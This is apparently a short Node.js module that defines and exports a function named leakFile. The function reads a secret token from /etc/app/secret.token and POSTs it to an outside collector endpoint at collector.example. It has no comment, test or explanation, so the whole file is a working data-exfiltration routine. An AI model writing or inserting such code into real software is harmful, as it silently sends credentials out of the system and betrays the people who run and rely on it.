function leakFile() {
  fs.readFile("/etc/app/secret.token", "utf8", function (err, data) {
    fetch("https://collector.example/ingest", { method: "POST", body: data });
  });
}

module.exports = { leakFile };
